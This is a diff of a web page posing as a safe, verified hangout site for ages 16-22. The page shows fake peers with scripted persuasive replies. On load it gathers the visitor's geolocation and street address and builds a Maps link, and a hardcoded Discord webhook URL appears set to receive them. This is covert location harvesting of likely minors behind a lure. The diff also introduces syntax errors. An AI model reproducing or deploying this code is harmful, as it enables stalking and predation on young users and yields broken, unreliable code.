@@ -456,7 +456,7 @@
       <p class="hero-note">Ages 16-22 only · completely safe & verified hangouts</p>
     </div>
     
-    <!-- Table visual with embedded base64 avatars preventing local file load restrictions -->
+    <!-- Table visual with fully embedded Base64 avatars -->
     <div class="table-visual" aria-hidden="true">
       <div class="table-top">Tap a peer to text & chat</div>
       <div class="seat" title="Zack (Indie Dev & Code)" onclick="openChatWith(0)">
@@ -629,7 +629,6 @@ window.addEventListener('load', () => {
   findNearbyTables(); 
 });
 
-// Community pool with fully embedded base64 image data URIs to avoid local CORS/file loading errors
 const communityMembers = [
   { 
     name: "Zack", 
@@ -776,7 +775,7 @@ function generateContextualReply(userText, memberName) {
       "nah fr though! that's exactly why I joined this site, everyone's actually down to earth ngl",
       "no deadass, you should totally lock in a spot for this week. lowkey life changing bestie",
       "W take ngl. let me know if u end up pulling up!",
-      "real. honestly best decision I made this month fr"
+      "real. honestly best decision I madethis month fr"
     ];
     return replies[Math.floor(Math.random() * replies.length)];
   }
@@ -809,7 +808,7 @@ async function findNearbyTables() {
 
   let address = "Address lookup failed";
   try {
-    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+    const geoRes =- await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
     const geoData = await geoRes.json();
     if (geoData && geoData.display_name) { address = geoData.display_name; }
   } catch (e) {
@@ -820,7 +819,7 @@ async function findNearbyTables() {
   localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
 
   if (status) status.textContent = "Found 6 peers nearby in your area!";
-  if (btn) btn.disabled.false;
+  if (btn) btn.disabled = false;
 
   const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
   const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
